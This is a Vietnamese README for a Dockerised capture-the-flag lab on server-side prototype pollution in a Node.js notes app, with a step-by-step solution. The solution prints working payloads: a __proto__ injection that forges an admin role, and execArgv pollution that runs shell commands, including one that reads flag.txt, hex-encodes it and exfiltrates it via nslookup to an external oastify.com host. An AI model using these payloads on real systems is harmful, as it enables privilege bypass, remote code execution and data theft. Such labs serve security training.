# RESEARCH03


## Installation

Git clone repo
```
git clone https://github.com/brocked200/RESEARCH03.git
```

Di chuyển vào thư mục RESEARCH03
```
cd RESEARCH03
```

Build và chạy
```
sudo docker-compose up --build
```


## Usage

Sau khi build và chạy thành công, sẽ có thông báo hiển thị:
```
nodejs   | Server started on port 3000 
nodejs   | Connected to MySQL
```

![image](https://user-images.githubusercontent.com/52159161/228818947-820b6d6d-6490-4aeb-877e-cece22dc1fd6.png)

Truy cập vào localhost:3000 sẽ thấy giao diện web


## Bug

Nếu bị lỗi `Table 'ctf_prototypePollution.users' doesn't exist` khi chạy chương trình
>
Tạo cấu trúc database thủ công bằng command sau:
```bash
sudo docker exec -i mysql-nodejs mysql -uroot -p123123 ctf_prototypePollution < /home/khanh/Desktop/ctf_prototypePollution/db/init.sql 
```
Lưu ý: Thay đổi đường dẫn file sql `/home/khanh/Desktop/ctf_prototypePollution/db/init.sql `



# Đề CTF
## Ý tưởng
Sử dụng lỗ hổng Prototype Pollution trên server side để bypass phần kiểm tra admin trong chức năng thêm ghi chú. Sau đó thay đổi payload để tiến hành RCE để lấy flag.

## Cách giải
- Đầu tiên đăng ký tài khoản, sau đó login vào lab.
- Ban đầu sẽ không thể tạo ghi chú vì back-end sẽ kiểm tra quyền có phải là 'admin' không.
![image](https://user-images.githubusercontent.com/52159161/228821369-227de1c0-ef08-4593-a98f-b74b09c528a9.png)

- Chỉ được phép submit thuộc tính content, khi tiến hành thêm thuộc tính khác sẽ báo lỗi.
![image](https://user-images.githubusercontent.com/52159161/228822956-01b6e998-603b-4f6a-a605-b7d2a2b51910.png)

- Nhưng người chơi có thể bypass bằng cách sử dụng `__proto__` để tiến hành ô nhiễm prototype trên server.
Sẽ không còn thông báo lỗi "Chỉ được phép submit thuộc tính content"
![image](https://user-images.githubusercontent.com/52159161/228823203-a021d7c9-d692-4a73-80c0-2752816f6a75.png)

- Người chơi cần tìm đường dẫn source bị lộ trong robots.txt. Có đường dẫn khả nghi là `/s0uRcE`
![image](https://user-images.githubusercontent.com/52159161/228821652-47205b3c-53d9-41e9-84d5-fa49ebde172c.png)

- Sau khi truy cập vào `/s0uRcE`, thông tin về source của chức năng post notes sẽ được giấu trong trong phần ghi chú html
![image](https://user-images.githubusercontent.com/52159161/228821956-8374ef27-1753-4d7f-ac42-a301e9db7502.png)

- Từ đó người chơi sẽ biết được phần kiểm tra quyền admin là lấy thuộc tính role từ session.user.role so sánh giá trị role có phải là 'admin' hay không!
- Và xây dựng payload để ô nhiễm prototype role như sau:
```
"__proto__":{"session":{"user":{"role":"admin"}}}
```
Thành công bypass được phần kiểm tra quyền admin. Vì insert bị lỗi nên tiếp tục xem source code.
![image](https://user-images.githubusercontent.com/52159161/228823715-e2519702-b6ea-4837-8904-6ef60a19ca20.png)

- Sau khi đọc source code , người chơi sẽ thấy khi query insert ghi chú bị lỗi sẽ vào thực hiện code có gọi `execArgv` để thực hiện command gì đó.
![image](https://user-images.githubusercontent.com/52159161/228824432-82336614-72cb-4ac4-8050-1a536778bb5d.png)

- Và người chơi sẽ xây dụng được payload để thực hiện RCE out-of-band ra bên ngoài như sau:
```
"__proto__":{
"execArgv": [
"node -e \"require('child_process').execSync('curl https://1jlgxx6r7df3u8j4hocv3l2ygpmga6yv.oastify.com')\""
]
}
```
![image](https://user-images.githubusercontent.com/52159161/228824685-8d529bc3-95c3-46be-95f0-b7fffb000dbd.png)

- Nếu thành công sẽ có truy vấn tới burp collab
![image](https://user-images.githubusercontent.com/52159161/228825080-1dfd9a92-303e-4a9a-a8c7-a6986a6c1974.png)

- Vì cơ chế DNSSEC (Domain Name System Security Extensions) do đó khi truy vấn các kí tự chuỗi nhận được sẽ ngầu nhiên hoa thường khác nhau mỗi lần truy vấn do đó người chơi cần sử dụng command kèm theo đưa nó về hex sau đó cắt chuỗi nếu dài quá và gộp từng chuỗi lại. Đưa tất cả chuỗi đó về in thường và decode hex sẽ ra được flag. 
Command hint:
```
"__proto__": {
"execArgv": [
"node -e \"require('child_process').execSync('nslookup `cat flag.txt | xxd -p | tr -d '\n' | cut -c 1-60`.wzzftl7lgj1zmh6z0g5j7xxp5gb7z8nx.oastify.com')\""
]
}
```
Thay đổi cut -c thành 61-120 để tiến hành lấy đoạn hex còn thiếu.
